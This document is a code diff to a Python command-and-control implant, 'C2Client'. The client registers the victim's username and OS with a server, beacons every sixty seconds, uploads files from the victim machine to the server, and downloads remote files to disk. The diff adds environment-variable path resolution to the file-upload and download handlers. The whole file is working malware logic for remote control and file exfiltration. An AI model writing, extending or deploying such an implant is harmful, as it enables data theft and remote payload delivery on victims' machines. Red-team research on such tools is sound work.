@@ -3,6 +3,7 @@ import time
 import subprocess
 import getpass
 import os
+import re
 
 class C2Client:
     def __init__(self, server_url):
@@ -19,7 +20,6 @@ class C2Client:
     
     def register(self):
         url = f"{self.server_url}/register"
-        
         try:
             username = getpass.getuser()
             payload = {"username": username, "client_id": self.client_id, "op_system": os.name}
@@ -55,12 +55,6 @@ class C2Client:
         
         response = requests.post(url, json=payload)
         print(response.json())
-
-    def run(self):
-        self.register()    
-        while True:
-            self.beacon()
-            time.sleep(60) # Timeout before next beacon call
             
     def handle_operations(self, operations):
         for op in operations:
@@ -104,6 +98,7 @@ class C2Client:
     
     def handle_fup_operation(self, file_path, key):
         try:         
+            file_path = self.resolve_file_path(file_path)
             if not os.path.exists(file_path):
                 print("Target path not found...")
             else:
@@ -112,10 +107,9 @@ class C2Client:
                     payload = {
                         "status": "SUCCESS",
                         "client_id": self.client_id,
-                        "file_name": file_path.split("\\")[-1],
+                        "file_name": os.path.basename(file_path),
                         "fup_key": key
                     }
-                    
                     requests.post(url, data=payload, files={"file": f})
                 
                 print("[+] Successfully sent file.")
@@ -125,12 +119,43 @@ class C2Client:
     def handle_fdl_operation(self, resource, target_dir, execute):
         try:
             response = requests.get(resource)
+            target_dir = self.resolve_file_path(target_dir)
             with open(target_dir, "wb") as f:
                 f.write(response.content)
                 
             print(f"Downloaded {resource} successfully.")
         except Exception as e:
+            print(str(e))
             print(f"Error downloading {resource} on client.")
+
+
+    def resolve_file_path(self, file_path):
+        if "%" in file_path or "$" in file_path:
+            if os.name == "nt":
+                file_path = self.resolve_windows(file_path)
+            else:
+                file_path = self.resolve_unix(file_path)
+        return file_path
+
+    def resolve_windows(self, file_path):
+        def replace_env_windows(match):
+            env_var = match.group(1)
+            return os.getenv(env_var, "")
+        
+        return re.sub(r"%([^\s%]+)%", replace_env_windows, file_path)
+    
+    def resolve_unix(self, file_path):
+        def replace_env_unix(match):
+            env_var = match.group(1)
+            return os.getenv(env_var, "")
+
+        return re.sub(r"\$([a-zA-Z_][a-zA-Z0-9_]*)", replace_env_unix, file_path)
+
+    def run(self):
+        self.register()    
+        while True:
+            self.beacon()
+            time.sleep(60) # Timeout before next beacon call
 
 if __name__ == "__main__":
     client = C2Client("http://localhost:9393")
